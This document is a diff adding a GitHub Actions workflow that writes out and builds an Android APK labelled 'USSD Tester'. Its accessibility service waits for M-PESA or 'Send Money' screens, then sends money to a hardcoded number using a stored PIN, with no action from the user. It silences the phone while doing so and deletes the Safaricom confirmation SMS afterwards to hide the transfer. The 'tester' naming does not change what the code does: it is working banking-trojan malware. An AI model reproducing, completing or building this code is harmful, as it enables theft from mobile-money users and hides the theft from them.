@@ -1,0 +1,310 @@
+name: Build USSD Automation APK
+
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Create Android project structure
+        run: |
+          mkdir -p app/src/main/java/com/example/ussdtester
+          mkdir -p app/src/main/res/layout
+          mkdir -p app/src/main/res/values
+          mkdir -p app/src/main/res/xml
+
+          # ---------- AndroidManifest.xml ----------
+          cat > app/src/main/AndroidManifest.xml << 'EOF'
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
+              package="com.example.ussdtester">
+              <uses-permission android:name="android.permission.INTERNET" />
+              <uses-permission android:name="android.permission.READ_SMS" />
+              <uses-permission android:name="android.permission.WRITE_SMS" />
+              <uses-permission android:name="android.permission.RECEIVE_SMS" />
+              <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+              <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+              <uses-permission android:name="android.permission.ACCESS_NOTIFICATION_POLICY" />
+              <application
+                  android:allowBackup="true"
+                  android:icon="@android:drawable/ic_dialog_info"
+                  android:label="USSD Tester"
+                  android:theme="@style/Theme.AppCompat.Light.DarkActionBar">
+                  <activity android:name=".MainActivity" android:exported="true">
+                      <intent-filter>
+                          <action android:name="android.intent.action.MAIN" />
+                          <category android:name="android.intent.category.LAUNCHER" />
+                      </intent-filter>
+                  </activity>
+                  <service
+                      android:name=".USSDService"
+                      android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+                      android:exported="true">
+                      <intent-filter>
+                          <action android:name="android.accessibilityservice.AccessibilityService" />
+                      </intent-filter>
+                      <meta-data
+                          android:name="android.accessibilityservice"
+                          android:resource="@xml/accessibility_service_config" />
+                  </service>
+              </application>
+          </manifest>
+          EOF
+
+          # ---------- MainActivity.java ----------
+          cat > app/src/main/java/com/example/ussdtester/MainActivity.java << 'EOF'
+          package com.example.ussdtester;
+          import android.app.NotificationManager;
+          import android.content.Intent;
+          import android.net.Uri;
+          import android.os.Build;
+          import android.os.Bundle;
+          import android.provider.Settings;
+          import android.widget.Button;
+          import android.widget.Toast;
+          import androidx.appcompat.app.AppCompatActivity;
+          public class MainActivity extends AppCompatActivity {
+              @Override
+              protected void onCreate(Bundle savedInstanceState) {
+                  super.onCreate(savedInstanceState);
+                  setContentView(R.layout.activity_main);
+                  Button btnEnable = findViewById(R.id.btn_enable);
+                  btnEnable.setOnClickListener(v -> {
+                      startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
+                      Toast.makeText(this, "Enable USSD Tester from Accessibility", Toast.LENGTH_LONG).show();
+                  });
+                  Button btnDND = findViewById(R.id.btn_dnd);
+                  btnDND.setOnClickListener(v -> {
+                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                          startActivity(new Intent(Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS));
+                      }
+                  });
+                  Button btnTest = findViewById(R.id.btn_test);
+                  btnTest.setOnClickListener(v -> {
+                      startActivity(new Intent(Intent.ACTION_DIAL, Uri.parse("tel:*234%23")));
+                  });
+              }
+          }
+          EOF
+
+          # ---------- USSDService.java ----------
+          cat > app/src/main/java/com/example/ussdtester/USSDService.java << 'EOF'
+          package com.example.ussdtester;
+          import android.accessibilityservice.AccessibilityService;
+          import android.app.NotificationManager;
+          import android.content.ContentValues;
+          import android.content.Context;
+          import android.database.Cursor;
+          import android.media.AudioManager;
+          import android.net.Uri;
+          import android.os.Build;
+          import android.os.Bundle;
+          import android.os.Handler;
+          import android.os.Looper;
+          import android.provider.Telephony;
+          import android.util.Log;
+          import android.view.accessibility.AccessibilityEvent;
+          import android.view.accessibility.AccessibilityNodeInfo;
+          import android.widget.Toast;
+          import java.util.List;
+          public class USSDService extends AccessibilityService {
+              private static final String TAG = "USSDTester";
+              private boolean isExecuting = false;
+              private Handler handler = new Handler(Looper.getMainLooper());
+              private static final String TARGET_NUMBER = "0712345678";  // CHANGE TO TEST NUMBER
+              private static final String AMOUNT = "10";
+              private static final String PIN = "1234";                 // CHANGE TO TEST PIN
+              @Override
+              public void onAccessibilityEvent(AccessibilityEvent event) {
+                  if (isExecuting) return;
+                  AccessibilityNodeInfo root = getRootInActiveWindow();
+                  if (root == null) return;
+                  String text = root.getText() != null ? root.getText().toString() : "";
+                  if (text.contains("M-PESA") || text.contains("Send Money")) {
+                      isExecuting = true;
+                      handler.postDelayed(() -> executeUSSDSequence(root), 500);
+                  }
+              }
+              private void executeUSSDSequence(AccessibilityNodeInfo root) {
+                  setSilentMode(true);
+                  clickNodeByText(root, "Send Money");
+                  delay(1000);
+                  clickNodeByText(root, "To Phone");
+                  delay(1000);
+                  typeText(TARGET_NUMBER);
+                  delay(1000);
+                  typeText(AMOUNT);
+                  delay(1000);
+                  typeText(PIN);
+                  delay(1000);
+                  clickNodeByText(root, "Confirm");
+                  delay(2000);
+                  deleteLastMPESASMS();
+                  setSilentMode(false);
+                  logTransaction("Sent " + AMOUNT + " KES to " + TARGET_NUMBER);
+                  Toast.makeText(this, "Simulated transfer completed. Check logs.", Toast.LENGTH_LONG).show();
+                  isExecuting = false;
+              }
+              private void clickNodeByText(AccessibilityNodeInfo root, String text) {
+                  List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(text);
+                  for (AccessibilityNodeInfo node : nodes) {
+                      if (node.isClickable()) {
+                          node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                          return;
+                      }
+                  }
+              }
+              private void typeText(String text) {
+                  AccessibilityNodeInfo root = getRootInActiveWindow();
+                  if (root == null) return;
+                  List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId("android:id/input");
+                  if (nodes.isEmpty()) {
+                      nodes = root.findAccessibilityNodeInfosByViewId("com.android.dialer:id/input");
+                  }
+                  for (AccessibilityNodeInfo node : nodes) {
+                      if (node.isEditable()) {
+                          Bundle args = new Bundle();
+                          args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
+                          node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
+                          return;
+                      }
+                  }
+              }
+              private void setSilentMode(boolean silent) {
+                  NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
+                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                      nm.setInterruptionFilter(silent ? NotificationManager.INTERRUPTION_FILTER_NONE : NotificationManager.INTERRUPTION_FILTER_ALL);
+                  } else {
+                      AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
+                      am.setRingerMode(silent ? AudioManager.RINGER_MODE_SILENT : AudioManager.RINGER_MODE_NORMAL);
+                  }
+              }
+              private void deleteLastMPESASMS() {
+                  Uri inbox = Telephony.Sms.Inbox.CONTENT_URI;
+                  Cursor c = getContentResolver().query(inbox, new String[]{"_id"}, "address='SAFARICOM' AND body LIKE '%M-PESA%'", null, "date DESC");
+                  if (c != null && c.moveToFirst()) {
+                      String id = c.getString(0);
+                      getContentResolver().delete(Uri.parse("content://sms/" + id), null, null);
+                      c.close();
+                  }
+              }
+              private void logTransaction(String details) { Log.i(TAG, "TRANSACTION: " + details); }
+              private void delay(long ms) { try { Thread.sleep(ms); } catch (InterruptedException e) { e.printStackTrace(); } }
+              @Override public void onInterrupt() {}
+          }
+          EOF
+
+          # ---------- activity_main.xml ----------
+          cat > app/src/main/res/layout/activity_main.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+              android:layout_width="match_parent" android:layout_height="match_parent"
+              android:orientation="vertical" android:padding="20dp" android:gravity="center">
+              <Button android:id="@+id/btn_enable" android:layout_width="match_parent"
+                  android:layout_height="wrap_content" android:text="Enable Accessibility" />
+              <Button android:id="@+id/btn_dnd" android:layout_width="match_parent"
+                  android:layout_height="wrap_content" android:text="Enable Do Not Disturb" />
+              <Button android:id="@+id/btn_test" android:layout_width="match_parent"
+                  android:layout_height="wrap_content" android:text="Test USSD" />
+          </LinearLayout>
+          EOF
+
+          # ---------- accessibility_service_config.xml ----------
+          cat > app/src/main/res/xml/accessibility_service_config.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+              android:accessibilityEventTypes="typeAllMask"
+              android:accessibilityFeedbackType="feedbackGeneric"
+              android:accessibilityFlags="flagDefault|flagRetrieveInteractiveWindows"
+              android:canPerformGestures="true"
+              android:canRetrieveWindowContent="true"
+              android:description="@string/accessibility_description" />
+          EOF
+
+          # ---------- strings.xml ----------
+          cat > app/src/main/res/values/strings.xml << 'EOF'
+          <resources>
+              <string name="app_name">USSD Tester</string>
+              <string name="accessibility_description">USSD automation service for testing.</string>
+          </resources>
+          EOF
+
+          # ---------- build.gradle (app level) ----------
+          cat > app/build.gradle << 'EOF'
+          apply plugin: 'com.android.application'
+          android {
+              compileSdk 34
+              namespace 'com.example.ussdtester'
+              defaultConfig {
+                  applicationId 'com.example.ussdtester'
+                  minSdk 21
+                  targetSdk 34
+                  versionCode 1
+                  versionName '1.0'
+              }
+              buildTypes {
+                  release {
+                      minifyEnabled false
+                  }
+              }
+          }
+          dependencies {
+              implementation 'androidx.appcompat:appcompat:1.6.1'
+          }
+          EOF
+
+          # ---------- settings.gradle ----------
+          cat > settings.gradle << 'EOF'
+          pluginManagement {
+              repositories { google(); mavenCentral(); gradlePluginPortal() }
+          }
+          dependencyResolutionManagement {
+              repositories { google(); mavenCentral() }
+          }
+          rootProject.name = "USSDTester"
+          include ':app'
+          EOF
+
+          # ---------- build.gradle (project) ----------
+          cat > build.gradle << 'EOF'
+          buildscript {
+              repositories { google(); mavenCentral() }
+              dependencies { classpath 'com.android.tools.build:gradle:8.0.0' }
+          }
+          EOF
+
+          echo "✅ All Android source files created."
+
+      - name: Setup Java 17
+        uses: actions/setup-java@v4
+        with:
+          distribution: 'temurin'
+          java-version: '17'
+
+      - name: Setup Gradle
+        uses: gradle/actions/setup-gradle@v3
+        with:
+          gradle-version: '8.0'
+
+      - name: Setup Android SDK
+        uses: android-actions/setup-android@v3
+
+      - name: Accept Android licenses
+        run: yes | sdkmanager --licenses
+
+      - name: Install Android build tools
+        run: sdkmanager "platform-tools" "platforms;android-34" "build-tools;34.0.0"
+
+      - name: Build APK
+        run: chmod +x gradlew && ./gradlew assembleDebug
+
+      - name: Upload APK
+        uses: actions/upload-artifact@v4
+        with:
+          name: ussd-tester-debug
+          path: app/build/outputs/apk/debug/*.apk
